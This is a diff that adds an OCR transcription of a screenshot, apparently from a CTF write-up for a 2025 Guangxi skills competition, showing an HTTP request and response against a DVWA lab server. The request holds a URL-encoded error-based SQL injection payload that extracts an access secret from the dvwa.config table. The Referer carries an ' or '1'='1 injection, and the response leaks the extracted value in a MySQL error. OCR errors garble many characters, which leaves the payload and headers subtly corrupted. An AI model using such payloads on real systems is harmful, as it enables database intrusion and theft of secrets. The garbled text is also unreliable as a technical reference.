@@ -1,0 +1,24 @@
+# OCR: 5c1c3c05e39e8199da6ccfaa44d9272f.webp
+# 来源: ./02-WriteUp/2025/2025-广西职业技能大赛/5c1c3c05e39e8199da6ccfaa44d9272f.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:26
+
+GET/vulnerabilities/sgl
+2BAND%29GT1DSUBSET%28C0NCAT%286X162/866/1%2C%28SELEC%26M1D
+28%28IFNULL%28CAST%28accesssecret%20AS%20NCHAR%29%2C0x20
+29%29%2C1%2C190%29%20FROM%20dvwa.config%200RDER%20BY%20access_key%29%2c0x71767a6b71%29%2C5495%29--%20PIvj&Submit=SubmitHTTP/1.1
+Accept-Encoding：identity Host:192.168.56.140
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.(windowsNT10.0;Win64;x64)AppleWebKit/537.36（KHTML,1ikeGecko)Chrome/139.0.0.Safari/537.36
+Accept:text/html,application/xhtml+xml,application/xml;q=o.9,image/avif,image/webp,image/apng,*/*;g=o.8,application/signed-exchange;v=b3g=o.7
+Referer：http://192.168.56.14e/vulnerabilities/sqli/?id=1'or1'%3D'1&Submit=Submit Accept-Language:zh-cN,zh;q=o.9
+Cookie:PHPsEssID=t9o3chravtmea47ar35jkddsc7;security=low
+Connection:close HTTP/1.1200OK
+Server: nginx/1.15.11
+Date:Wed,17Sep2o253:57:54GMT
+Content-Type：text/html:charset=UTF-8
+Transfer-Encoding:chunked Connection:close
+X-Powered-By:PHP/7.3.4
+Expires:Thu,19Nov1981e8:52:ooGMT
+Cache-Controlno-store,no-cache,must-revalidate Pragma:no-cache
+<pre>MalformedGTIDsetspecification'qbxkq65d62feo-e54b-43fc-aac7-2d451a951e13qvzkq'.</pre>
